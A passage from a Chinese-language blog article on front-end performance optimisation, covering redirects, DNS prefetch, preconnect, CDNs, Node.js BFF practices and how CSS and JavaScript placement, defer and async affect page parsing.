HTTP/2 Push 下，使用了之前连接中推送的资源。不过为了保证思路的连贯，我还是把「发送请求」这个章节整体放在「缓存」之后了。</p>\n</blockquote>\n<p>介绍网络请求其实可以包含复杂的网络知识。不过，今天咱们的旅程主要聚焦于“前端性能优化”。因此，主要会介绍一些在这个环节中，前端性能优化可能会做的事儿。</p>\n<h2 id="避免多余重定向"><a href="#%E9%81%BF%E5%85%8D%E5%A4%9A%E4%BD%99%E9%87%8D%E5%AE%9A%E5%90%91" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>避免多余重定向</h2>\n<p>重定向是一个比较常用的技术手段。在一些情况下，你可能进行了服务迁移，修改了原有的 uri。这时候就可以使用重定向，把访问原网址的用户重定向到新的 uri。还有是在一些登录场景下，会使用到重定向技术。</p>\n<p>重定向分为 301 的永久重定向和 302 的临时重定向。建议贴合语义，例如服务迁移的情况下，使用 301 重定向。对 SEO 也会更友好。</p>\n<p>同时也不要滥用重定向。曾今也见过有业务在访问后重定向 3 次的情况，其实里面有些是不必要的。每次重定向都是有请求耗时的，建议避免过多的重定向。</p>\n<h2 id="dns-预解析"><a href="#dns-%E9%A2%84%E8%A7%A3%E6%9E%90" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>DNS 预解析</h2>\n<p>基本我们访问远程服务的时候，不会直接使用服务的 IP，而是使用域名。所以请求的一个重要环节就是域名解析。</p>\n<p>DNS 服务本身是一个树状层级结构，其解析是一个递归与迭代的过程。例如 github.com 的大致解析流程如下：</p>\n<ol>\n<li>先检查本地 hosts 文件中是否有映射，有则使用；</li>\n<li>查找本地 DNS 缓存，有则返回；</li>\n<li>根据配置在 TCP/IP 参数中设置 DNS 查询服务器，并向其进行查询，这里先称为本地 DNS；</li>\n<li>如果该服务器无法解析域名（没有缓存），且不需要转发，则会向根服务器请求；</li>\n<li>根服务器根据域名类型判断对应的顶级域名服务器（.com），返回给本地 DNS，然后重复该过程，直到找到该域名；</li>\n<li>当然，如果设置了转发，本地 DNS 会将请求逐级转发，直到转发服务器返回或者也不能解析。</li>\n</ol>\n<p>这里我们需要了解的是：</p>\n<ul>\n<li>首先，DNS 解析流程可能会很长，耗时很高，所以整个 DNS 服务，包括客户端都会有缓存机制，这个作为前端不好涉入；</li>\n<li>其次，在 DNS 解析上，前端还是可以通过浏览器提供的其他手段来“加速”的。</li>\n</ul>\n<p>DNS Prefetch 就是浏览器提供给我们的一个 API。它是 Resource Hint 的一部分。它可以告诉浏览器：过会我就可能要去 yourwebsite.com 上下载一个资源啦，帮我先解析一下域名吧。这样之后用户点击某个按钮，触发了 yourwebsite.com 域名下的远程请求时，就略去了 DNS 解析的步骤。使用方式很简单：</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="93418514417834130000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`<link rel=&quot;dns-prefetch&quot; href=&quot;//yourwebsite.com&quot; />`, `93418514417834130000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                title="html"\n              >\n                <span class="gatsby-code-button-language">html</span>\n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="html"><pre style="counter-reset: linenumber NaN" class="language-html line-numbers"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>dns-prefetch<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>//yourwebsite.com<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span></span></pre></div>\n<p>当然，浏览器并不保证一定会去解析域名，可能会根据当前的网络、负载等状况做决定。标准里也明确写了</p>\n<blockquote>\n<p>user agent SHOULD resolve as early as possible</p>\n</blockquote>\n<h2 id="预先建立连接"><a href="#%E9%A2%84%E5%85%88%E5%BB%BA%E7%AB%8B%E8%BF%9E%E6%8E%A5" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>预先建立连接</h2>\n<p>我们知道，建立连接不仅需要 DNS 查询，还需要进行 TCP 协议握手，有些还会有 TLS/SSL 协议，这些都会导致连接的耗时。使用 Preconnect 可以帮助你告诉浏览器：“我有一些资源会用到某个源（origin），你可以帮我预先建立连接。”</p>\n<p>根据规范，当你使用 Preconnect 时，浏览器大致做了如下处理：</p>\n<ul>\n<li>首先，解析 Preconnect 的 url；</li>\n<li>其次，根据当前 link 元素中的属性进行 cors 的设置；</li>\n<li>然后，默认先将 credential 设为 true，如果 cors 为 Anonymous 并且存在跨域，则将 credential 置为 false；</li>\n<li>最后，进行连接。</li>\n</ul>\n<p>使用 Preconnect 只需要将 rel 属性设为 preconnect 即可：</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="40892470574658660000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`<link rel=&quot;preconnect&quot; href=&quot;//sample.com&quot; />`, `40892470574658660000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                title="html"\n              >\n                <span class="gatsby-code-button-language">html</span>\n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="html"><pre style="counter-reset: linenumber NaN" class="language-html line-numbers"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>preconnect<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>//sample.com<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span></span></pre></div>\n<p>当然，你也可以设置 CORS：</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="64943667581605680000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`<link rel=&quot;preconnect&quot; href=&quot;//sample.com&quot; crossorigin />`, `64943667581605680000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                title="html"\n              >\n                <span class="gatsby-code-button-language">html</span>\n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="html"><pre style="counter-reset: linenumber NaN" class="language-html line-numbers"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>preconnect<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>//sample.com<span class="token punctuation">"</span></span> <span class="token attr-name">crossorigin</span> <span class="token punctuation">/></span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span></span></pre></div>\n<p>需要注意的是，标准并没有硬性规定浏览器一定要（而是 SHOULD）完成整个连接过程，与 DNS Prefetch 类似，浏览器可以视情况完成部分工作。</p>\n<h2 id="使用-cdn"><a href="#%E4%BD%BF%E7%94%A8-cdn" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>使用 CDN</h2>\n<p>当我们实际把网络包发向我们的目标地址时，肯定希望越快到达目的地越好（对应的，也会希望越快获得响应）。而网络传输是有极限的，同样一个北京的用户，访问北京的服务器显然要比广州快很多。同时，服务的负载也会影响响应的速度。</p>\n<p>对于静态资源，我们可以考虑通过 CDN 来降低时延。</p>\n<p>对于使用 CDN 的资源，DNS 解析会将 CDN 资源的域名解析到 CDN 服务的负载均衡器上，负载均衡器可以通过请求的信息获取用户对应的地理区域，从而通过负载均衡算法，在背后的诸多服务器中，综合选择一台地理位置近、负载低的机器来提供服务。例如为北京联通用户解析北京的服务器 IP。这样，用户在之后访问 CDN 资源时都是访问北京服务器，距离近，速度快。</p>\n<p>下图是请求声明周期中各个阶段的示意图，可以帮助我们理解发送请求（以及接收响应）的流程。</p>\n<p><html><head></head><body><a class="gatsby-resp-image-link" href="/static/2021-07-21-00-30-04-264f3cacdc98cb52c234ae7cc8a53df1-aea66.png" style="display: block" target="_blank" rel="noopener">\n  \n  <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;">\n    <span class="gatsby-resp-image-background-image" style="padding-bottom: 41.986455981941305%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAIAAAB2/0i6AAAACXBIWXMAAA7DAAAOwwHHb6hkAAABFElEQVQY032Q20rDQBRF5///R2rBmgefVCzaxKI2TdWSTAIhMZ37LbrjqEhB52Fmz+GsfS7k/fswxoZh8N5ba8dx/In/1keHxAcMyL7vOedd18HIGBNCiORf/BcshHDOQeCGkZQSfNu2ZVlC/FcZRQBDoJTWGl/wcIGu67ooCkppTDiG0RK8gcWyUipEMDY0APBKKQyCOIIYLTYY40RJZKi4GjTr3LQtbE1rKTjj7OCdjXuzRoXgPhv08EWD5LWRG+pzavM6ZDu2qexTaR726v5FpDuWPfNtE/LKIeexskXjIbaNl3pyJOu9PV2K2VWXpDpZiZPL7uyWzZeHxR2DSDINPbt+O0/NYmXmNwP0xdpIM435AWFIyb9Yn7DNAAAAAElFTkSuQmCC\'); background-size: cover; display: block;">\n      <img class="gatsby-resp-image-image lazy" style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;" alt="2021 07 21 00 30 04" title="" data-src="/static/2021-07-21-00-30-04-264f3cacdc98cb52c234ae7cc8a53df1-fee1c.png" data-srcset="/static/2021-07-21-00-30-04-264f3cacdc98cb52c234ae7cc8a53df1-a67b7.png 200w,\n/static/2021-07-21-00-30-04-264f3cacdc98cb52c234ae7cc8a53df1-0b187.png 400w,\n/static/2021-07-21-00-30-04-264f3cacdc98cb52c234ae7cc8a53df1-fee1c.png 800w,\n/static/2021-07-21-00-30-04-264f3cacdc98cb52c234ae7cc8a53df1-aea66.png 886w" data-sizes="(max-width: 800px) 100vw, 800px">\n    </span>\n  </span>\n  \n  </a>\n    </body></html></p>\n<p>在缓存没法满足我们的情况下，就要开始真正发送请求了。从前端性能优化视角，我们会关注重定向、DNS 解析等问题，从而加速请求。但这块还预留了一小部分 —— 服务端的处理与响应。</p>\n<p>过去，我们会将前端局限在浏览器中，但是随着 NodeJS 的兴起，很多业务都引入了基于 NodeJS 的 BFF 来为前端（客户端端）提供服务。所以咱们这次的旅程也会简单聊一下，在这一阶段可以做的一些优化。</p>\n<h1 id="服务端响应"><a href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%93%8D%E5%BA%94" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>服务端响应</h1>\n<p>把这一部分放进前端性能优化并不是很严谨：</p>\n<ul>\n<li>服务端有着服务端的通用技术手段，这块深入去研究，会是一个不一样的领域；</li>\n<li>我们既然在讨论前端性能优化，这部分主要还是指 NodeJS，但不是所有业务都使用 NodeJS。</li>\n</ul>\n<p>所以这里只会提一些实践中碰到的小点，辅以一些拓展阅读，希望能帮助大家抛砖引玉，开拓思维。</p>\n<h2 id="使用流进行响应"><a href="#%E4%BD%BF%E7%94%A8%E6%B5%81%E8%BF%9B%E8%A1%8C%E5%93%8D%E5%BA%94" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>使用流进行响应</h2>\n<p>目前，现代浏览器都支持根据流的返回形式来逐步进行页面内容的解析、处理。这就意味着，即使请求的响应没有完全结束，浏览器也可以从手里已有的响应结果中进行页面的解析与渲染。</p>\n<p>例如 <a href="https://github.com/kkuchta/css-only-chat" target="_blank" rel="nofollow noreferrer noopener">css-only-chat-node</a> 就利用了这个特点来实现无刷新、无 JavaScript 的页面更新。</p>\n<h2 id="业务聚合"><a href="#%E4%B8%9A%E5%8A%A1%E8%81%9A%E5%90%88" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>业务聚合</h2>\n<p>BFF 非常合适做的一件事就是后端服务的聚合。</p>\n<p>如果你有一个两个接口服务：第一个服务是先获取产品信息，再根据产品信息中的上架时间通过第二个服务获取该时间后的产品列表。这个业务逻辑如果放在前端（浏览器）处理将会串行发送两个请求。假设每个请求 200ms，那么就需要等待 400ms。如果引入 NodeJS，这一层可以放在 NodeJS 中实现。NodeJS 部署的位置一般离其他后端服务“更近”，例如同一个局域网。这类服务间的请求耗时显然更低，可能只需要 200(浏览器) + 30(NodeJS) * 2 = 260ms。</p>\n<p>此外，如果一个业务需要在前端并发三、四个请求来获取完整数据，那么放在 NodeJS 的 BFF 层也是一个不错的选择。</p>\n<h2 id="避免代码问题"><a href="#%E9%81%BF%E5%85%8D%E4%BB%A3%E7%A0%81%E9%97%AE%E9%A2%98" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>避免代码问题</h2>\n<p>代码问题其实就非常细节了。简单列举一些常见的问题：</p>\n<ul>\n<li>async await 的不当使用导致并行请求被串行化了；</li>\n<li>频繁地 JSON.parse 和 JSON.stringify 大对象；</li>\n<li>正则表达式的灾难性回溯；</li>\n<li>闭包导致的内存泄漏；</li>\n<li>CPU 密集型任务导致事件循环 delay 严重；</li>\n<li>未捕获的异常导致进程频繁退出，守护进程（pm2/supervisor）又将进程重启，这种频繁的启停也会比较消耗资源；</li>\n</ul>\n<h1 id="页面解析与处理"><a href="#%E9%A1%B5%E9%9D%A2%E8%A7%A3%E6%9E%90%E4%B8%8E%E5%A4%84%E7%90%86" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>页面解析与处理</h1>\n<p>这一阶段浏览器需要处理的东西很多，为了更好地理解性能优化，我们主要将其分为几个部分：</p>\n<ul>\n<li>页面 DOM 的解析；</li>\n<li>页面静态资源的加载，包括了页面引用的 JavaScript/CSS/图片/字体等；</li>\n<li>静态资源的解析与处理，像是 JavaScript 的执行、CSSOM 的构建与样式合成等；</li>\n</ul>\n<p>大致过程就是解析页面 DOM 结构，遇到外部资源就加载，加载好了就使用。但是由于这部分的内容比较多，所以在这一节里我们重点关注页面的解析（其他部分在写一节中介绍）。</p>\n<h2 id="注意资源在页面文档中的位置"><a href="#%E6%B3%A8%E6%84%8F%E8%B5%84%E6%BA%90%E5%9C%A8%E9%A1%B5%E9%9D%A2%E6%96%87%E6%A1%A3%E4%B8%AD%E7%9A%84%E4%BD%8D%E7%BD%AE" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>注意资源在页面文档中的位置</h2>\n<p>我们的目标是收到内容就尽快解析处理，页面有依赖的资源就尽快发送请求，收到响应则尽快处理。然而，这个美好的目标也有可能会被我们不小心破坏。</p>\n<p>JavaScript 脚本和 CSS 样式表在关于 DOM 元素的属性，尤其是样式属性上都有操作的权利。这就像是一个多线程问题。服务端多线程编程中经常通过锁来保证线程间的互斥。回到咱们的前端，现在也是两方在竞争同一个资源，显然也是会有互斥的问题。这就带来了 DOM 解析、JavaScript 加载与执行、CSS 加载与使用之间的一些互斥关系。</p>\n<p>仅仅看 DOM 与 CSS 的关系，则如下图所示：</p>\n<p><html><head></head><body><a class="gatsby-resp-image-link" href="/static/2021-07-21-15-16-43-993036ea1266ce38a4d0254412aad9a8-092d7.png" style="display: block" target="_blank" rel="noopener">\n  \n  <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; ; max-width: 626px; margin-left: auto; margin-right: auto;">\n    <span class="gatsby-resp-image-background-image" style="padding-bottom: 24.760383386581466%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAAsSAAALEgHS3X78AAAA7UlEQVQY02NISUnZv39/V3unpijH/t1RB/ZE79kRKSbKxcDAwMjIyIAfODk5NTQ0REZGifCyNtTatDbb11ZZKwlxqKioqOvoqGtpMTMyiAoLGxoa6uvrCwoIsDAwaGpqAtnq6uroZkFs42dlXr1z57ZTp7cePyHIypQVG33l+vXz58+H+PmKMjEcOnDgwsWL27ZtY0hNTV23bl1JYbG8IOuqpQErlwUuXeinJsYlKyOvpq2toKwMNIyfn19VVRXoFl4eHqDRCgoKQK6cnBxDeHj49BnTkxOTJflYJve7Tp3k1tftIijIAXYFAS8DAEFTQYyTB8E/AAAAAElFTkSuQmCC\'); background-size: cover; display: block;">\n      <img class="gatsby-resp-image-image lazy" style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;" alt="2021 07 21 15 16 43" title="" data-src="/static/2021-07-21-15-16-43-993036ea1266ce38a4d0254412aad9a8-092d7.png" data-srcset="/static/2021-07-21-15-16-43-993036ea1266ce38a4d0254412aad9a8-52e9c.png 200w,\n/static/2021-07-21-15-16-43-993036ea1266ce38a4d0254412aad9a8-39c77.png 400w,\n/static/2021-07-21-15-16-43-993036ea1266ce38a4d0254412aad9a8-092d7.png 626w" data-sizes="(max-width: 626px) 100vw, 626px">\n    </span>\n  </span>\n  \n  </a>\n    </body></html></p>\n<p>HTML 解析为 DOM Tree，CSS 解析为 CSSOM，两者再合成 Render Tree，并行执行，非常完美。然而，当 JavaScript 入场之后，局面就变了：</p>\n<p><html><head></head><body><a class="gatsby-resp-image-link" href="/static/2021-07-21-15-16-52-ec216c8f2f69b24795d4cfda29cc5d03-092d7.png" style="display: block" target="_blank" rel="noopener">\n  \n  <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; ; max-width: 626px; margin-left: auto; margin-right: auto;">\n    <span class="gatsby-resp-image-background-image" style="padding-bottom: 24.760383386581466%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAAsSAAALEgHS3X78AAAA+0lEQVQY02NISUnZv39/S0ubkiD7rm1hu3dF7d4RKSbKxcDAwMjIyIAfODk5NTY2FmRm6ciLz+j3X9DlUl9lpSTEoaKioq6jo66lxczIICosbGhoqK+vLyggwMLAoKmpCWSrq6uD9APNz/P26snIrAyMNxWRAIoIsLGs3rlz2+nTW4+fEGRhyoqNvnr9+vnz50P8fEWZGA4dOHDh4sVt27YxpKamrlu3rry4VFmYfc2K4A3LA5ct9FMT45KVkVfT1lZQVgYazc/Pr6qqCnQLLw8P0GgFBQUgV05OjiE8PHz69OnJicmSfCyTJ7hNmeTe1+0iKMgB9jMBLwMAgEZGRUQlksEAAAAASUVORK5CYII=\'); background-size: cover; display: block;">\n      <img class="gatsby-resp-image-image lazy" style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;" alt="2021 07 21 15 16 52" title="" data-src="/static/2021-07-21-15-16-52-ec216c8f2f69b24795d4cfda29cc5d03-092d7.png" data-srcset="/static/2021-07-21-15-16-52-ec216c8f2f69b24795d4cfda29cc5d03-52e9c.png 200w,\n/static/2021-07-21-15-16-52-ec216c8f2f69b24795d4cfda29cc5d03-39c77.png 400w,\n/static/2021-07-21-15-16-52-ec216c8f2f69b24795d4cfda29cc5d03-092d7.png 626w" data-sizes="(max-width: 626px) 100vw, 626px">\n    </span>\n  </span>\n  \n  </a>\n    </body></html></p>\n<p>根据标准规范，在 JavaScript 中可以访问 DOM。因此当遇到 JavaScript 后会阻塞 DOM 的解析。于此同时，为避免 CSS 与 JavaScript 之间的竞态，CSSOM 的构建会阻塞 JavaScript 的脚本执行。总结起来就是</p>\n<blockquote>\n<p>JavaScript 会阻塞 DOM 构建，而 CSSOM 的构建又会阻塞 JavaScript 的执行。</p>\n</blockquote>\n<p>所以这就是为什么在优化的最佳实践中，我们基本都推荐把 CSS 样式表放在 <code class="language-text">&lt;head&gt;</code> 之中（即页面的头部），把 JavaScript 脚本放在 <code class="language-text">&lt;body&gt;</code> 的最后（即页面的尾部）。</p>\n<h2 id="使用-defer-和-async"><a href="#%E4%BD%BF%E7%94%A8-defer-%E5%92%8C-async" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>使用 defer 和 async</h2>\n<p>上面提到了，当 DOM 解析遇到 JavaScript 脚本时，会停止解析，开始下载脚本并执行，再恢复解析，相当于是阻塞了 DOM 构建。</p>\n<p>那除了将脚本放在 body 的最后，还有什么优化方法么？是有的。</p>\n<p>可以使用 defer 或 async 属性。两者都会防止 JavaScript 脚本的下载阻塞 DOM 构建。但是两者也有区别，最直观的表现如下：</p>\n<p><html><head></head><body><a class="gatsby-resp-image-link" href="/static/2021-07-21-15-19-34-b12d3e9d4e8d3cc357f3f1f598c91c90-55e1c.png" style="display: block" target="_blank" rel="noopener">\n  \n  <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; ; max-width: 689px; margin-left: auto; margin-right: auto;">\n    <span class="gatsby-resp-image-background-image" style="padding-bottom: 16.25544267053701%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAAsSAAALEgHS3X78AAAAiklEQVQI1w3LWw6EIAxAUfe/TkegpbTIu4COyU3O1z3iLUS41tTVHRj0sJ/dZ6rKVaVNRonIG2VXSoshN181lgK9yyExANrv6Vqs+1kwa2tRTgPSwKzoBE5PJwUUzNWmDrFePVyr3EfOOYQQRXQOT56I3vepg++G6asjJbLsjXwaZZuqKxqy8tjtD8nPqdakLsWpAAAAAElFTkSuQmCC\'); background-size: cover; display: block;">\n      <img class="gatsby-resp-image-image lazy" style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;" alt="2021 07 21 15 19 34" title="" data-src="/static/2021-07-21-15-19-34-b12d3e9d4e8d3cc357f3f1f598c91c90-55e1c.png" 